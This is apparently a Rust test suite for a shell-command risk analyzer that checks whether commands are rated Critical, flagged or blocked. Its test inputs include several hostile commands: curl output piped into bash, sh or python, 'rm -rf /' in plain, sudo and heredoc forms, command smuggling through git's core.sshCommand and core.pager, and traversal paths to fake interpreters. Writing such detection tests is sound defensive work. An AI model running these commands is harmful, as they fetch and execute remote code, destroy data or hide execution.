use crate::interpret;
use distill_core::{
    AnalyzeRequest, CommandForm, CommandKind, Config, CoverageSummary, ExecutionContext,
    Integration, Severity, ShellDialect,
};

fn request(text: &str) -> AnalyzeRequest {
    AnalyzeRequest {
        protocol_version: 1,
        request_id: "shell-test".into(),
        command: CommandForm {
            kind: CommandKind::Shell,
            text: text.into(),
            dialect: ShellDialect::Bash,
        },
        cwd: "/workspace".into(),
        session_id: None,
        source: Integration::Cli,
        budget_ms: 900,
        context: ExecutionContext::default(),
    }
}

#[test]
fn line_continuations_preserve_executable_identity() {
    let source = "no\\\nde -e 'console.log(1)'";
    let mut parser = tree_sitter::Parser::new();
    parser
        .set_language(&tree_sitter_bash::LANGUAGE.into())
        .unwrap();
    let tree = parser.parse(source, None).unwrap();
    let draft = interpret(&request(source), &Config::default());
    assert_eq!(
        draft.max_severity,
        Some(Severity::Low),
        "{}; {:?}",
        tree.root_node().to_sexp(),
        draft.unknowns
    );
}

#[test]
fn wrapped_streams_and_substitutions_keep_critical_findings() {
    for source in [
        "curl https://example.invalid/a | env bash",
        "curl https://example.invalid/a | timeout 3 nohup /bin/sh",
        "curl https://example.invalid/a | env -u TOKEN python3 -",
        "cat <(curl https://example.invalid/a | sh)",
        "echo $(curl https://example.invalid/a | env sh)",
        "rm -rf /; echo '",
    ] {
        let draft = interpret(&request(source), &Config::default());
        assert_eq!(
            draft.max_severity,
            Some(Severity::Critical),
            "{source}: {:?}",
            draft.unknowns
        );
    }
}

#[test]
fn heredoc_code_data_and_outer_expansions_are_distinct() {
    for source in [
        "python3 - <<'PY'\nprint(1)\nPY",
        "node - <<'JS'\nconsole.log(1)\nJS",
        "sh <<'SH'\nprintf hi\nSH",
        "cat <<'TEXT'\n$(rm -rf /)\nTEXT",
        "python3 -c 'print(1)' <<'DATA'\nos.system('rm -rf /')\nDATA",
    ] {
        let draft = interpret(&request(source), &Config::default());
        assert_eq!(
            draft.coverage.summary,
            CoverageSummary::StaticAccounted,
            "{source}: {:?}",
            draft.unknowns
        );
        assert!(draft.max_severity <= Some(Severity::Low), "{source}");
    }
    for source in ["cat <<TEXT\n$(rm -rf /)\nTEXT", "sh <<'SH'\nrm -rf /\nSH"] {
        let draft = interpret(&request(source), &Config::default());
        assert_eq!(
            draft.max_severity,
            Some(Severity::Critical),
            "{source}: {:?}",
            draft.unknowns
        );
    }
}

#[test]
fn deadline_and_unsupported_shell_never_claim_complete_coverage() {
    let mut req = request("echo hello");
    req.budget_ms = 0;
    let draft = interpret(&req, &Config::default());
    assert_eq!(draft.coverage.summary, CoverageSummary::Stopped);
    req.budget_ms = 900;
    req.command.dialect = ShellDialect::Unsupported;
    let draft = interpret(&req, &Config::default());
    assert_ne!(draft.coverage.summary, CoverageSummary::StaticAccounted);
    assert!(
        draft
            .unknowns
            .iter()
            .any(|reason| reason.contains("unsupported"))
    );
}

#[test]
fn wrappers_and_substitutions_do_not_leak_their_working_directory() {
    for source in [
        "env -C / echo hi; rm -rf build",
        "echo $(cd /); rm -rf build",
        "(cd /); rm -rf build",
        "cd / | cat; rm -rf build",
    ] {
        let draft = interpret(&request(source), &Config::default());
        assert!(
            draft.max_severity < Some(Severity::Critical),
            "{source}: {:?}",
            draft.findings
        );
        assert!(
            draft
                .behaviors
                .iter()
                .any(|b| b.target.as_deref() == Some("/workspace/build")),
            "{source}: {:?}",
            draft.behaviors
        );
    }
}

#[test]
fn unknown_wrapper_options_are_visible_and_known_flags_preserve_effects() {
    let draft = interpret(
        &request("env --unknown-command-option echo hi"),
        &Config::default(),
    );
    assert_ne!(draft.coverage.summary, CoverageSummary::StaticAccounted);
    let draft = interpret(&request("sudo -u root rm -rf /"), &Config::default());
    assert_eq!(draft.max_severity, Some(Severity::Critical));
}

#[cfg(unix)]
#[test]
fn symlink_parent_traversal_obeys_declared_workspace_boundary() {
    use std::{fs, os::unix::fs::symlink};
    let root = std::env::temp_dir().join(distill_core::new_id("distill-path-test"));
    let workspace = root.join("workspace");
    let external = root.join("external/child");
    fs::create_dir_all(&workspace).unwrap();
    fs::create_dir_all(&external).unwrap();
    symlink(&external, workspace.join("link")).unwrap();
    let mut req = request("echo hi > link/../result");
    req.cwd = workspace.clone();
    req.context.workspace_roots = vec![workspace];
    let draft = interpret(&req, &Config::default());
    assert!(
        draft
            .findings
            .iter()
            .any(|f| f.rule_id == "modify.outside-workspace"),
        "{:?}",
        draft.findings
    );
    assert!(draft.behaviors.iter().any(|b| {
        b.target
            .as_deref()
            .is_some_and(|path| path.ends_with("/external/result"))
    }));
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn shared_node_budget_is_not_reset_by_language_handoff() {
    let mut config = Config::default();
    config.analysis.graph_nodes_max = 20;
    let source = "python3 -c 'a=1; b=2; c=3; d=4; print(a+b+c+d)'";
    let draft = interpret(&request(source), &config);
    assert_eq!(draft.coverage.summary, CoverageSummary::Stopped);
    assert!(
        draft
            .unknowns
            .iter()
            .any(|reason| reason.contains("node budget"))
    );
}

#[test]
fn profile_effects_use_the_shared_policy_and_keep_unknown_flags_partial() {
    let mut config = Config::default();
    config.policy.effects.write = Severity::High;
    let draft = interpret(&request("mkdir -p build/cache"), &config);
    assert_eq!(draft.max_severity, Some(Severity::High));
    assert!(
        draft
            .behaviors
            .iter()
            .any(|behavior| behavior.kind == distill_core::EffectKind::FileWrite)
    );
    let draft = interpret(&request("touch --unmodeled target"), &config);
    assert_ne!(draft.coverage.summary, CoverageSummary::StaticAccounted);
    let draft = interpret(&request("git -c core.sshCommand='sh -c id' fetch"), &config);
    assert!(
        draft
            .findings
            .iter()
            .any(|finding| finding.rule_id == "exec.git-config")
    );
}

#[test]
fn trusted_prefix_cannot_hide_parent_traversal() {
    for source in [
        "/usr/bin/../../tmp/python3 -c 'print(1)'",
        "/usr/bin/../bin/python3 -c 'print(1)'",
        "/usr/bin-other/python3 -c 'print(1)'",
        "/opt/homebrew/bin/../../../tmp/node -e 'console.log(1)'",
    ] {
        let draft = interpret(&request(source), &Config::default());
        assert_ne!(
            draft.coverage.summary,
            CoverageSummary::StaticAccounted,
            "{source}"
        );
        let report = distill_rules::score(&request(source), draft, &Config::default(), 0);
        assert_ne!(report.decision, distill_core::Decision::Allow, "{source}");
    }
}

#[test]
fn current_branch_query_is_safe_without_masking_extra_operands_or_flags() {
    let config = Config::default();
    for source in [
        "git branch --show-current",
        "git --no-pager branch --show-current",
    ] {
        let draft = interpret(&request(source), &config);
        assert_eq!(draft.max_severity, Some(Severity::Safe), "{source}");
        assert_eq!(draft.coverage.summary, CoverageSummary::StaticAccounted);
    }
    for source in [
        "git branch --show-current -D main",
        "git branch new-name --show-current",
        "git branch --show-current --unknown",
        "git -c core.pager=evil branch --show-current",
    ] {
        let req = request(source);
        let report = distill_rules::score(&req, interpret(&req, &config), &config, 0);
        assert_ne!(report.decision, distill_core::Decision::Allow, "{source}");
    }
}

#[test]
fn literal_mktemp_templates_use_write_policy_without_guessing_environment_defaults() {
    let config = Config::default();
    for source in [
        "mktemp /private/tmp/demo.XXXXXX",
        "mktemp -dq /private/tmp/demo.XXXXXX",
    ] {
        let draft = interpret(&request(source), &config);
        assert_eq!(
            draft.coverage.summary,
            CoverageSummary::StaticAccounted,
            "{source}"
        );
        assert!(
            draft
                .findings
                .iter()
                .any(|finding| finding.rule_id == "write.temporary")
        );
        assert_eq!(draft.max_severity, Some(config.policy.effects.write));
    }
    for source in [
        "mktemp",
        "mktemp -u /private/tmp/demo.XXXXXX",
        "mktemp -t demo",
        "mktemp invalid-template",
        "mktemp one.XXXXXX two.XXXXXX",
    ] {
        assert_ne!(
            interpret(&request(source), &config).coverage.summary,
            CoverageSummary::StaticAccounted,
            "{source}"
        );
    }
    assert_eq!(
        interpret(
            &request("mktemp /Library/LaunchAgents/demo.XXXXXX"),
            &config
        )
        .max_severity,
        Some(Severity::High)
    );
}

#[cfg(unix)]
#[test]
fn symlink_out_of_trusted_executable_directory_is_untrusted() {
    use std::{fs, os::unix::fs::symlink};
    let root = std::env::temp_dir().join(distill_core::new_id("distill-executable-test"));
    let trusted = root.join("trusted");
    let outside = root.join("outside");
    fs::create_dir_all(&trusted).unwrap();
    fs::create_dir_all(&outside).unwrap();
    fs::write(outside.join("python3"), "not executed").unwrap();
    symlink(outside.join("python3"), trusted.join("python3")).unwrap();
    assert!(!crate::trusted_path_in_roots(
        &trusted.join("python3"),
        &[trusted.to_str().unwrap()]
    ));
    fs::write(trusted.join("real-python3"), "not executed").unwrap();
    symlink(trusted.join("real-python3"), trusted.join("alias")).unwrap();
    assert!(crate::trusted_path_in_roots(
        &trusted.join("alias"),
        &[trusted.to_str().unwrap()]
    ));
    fs::remove_dir_all(root).unwrap();
}
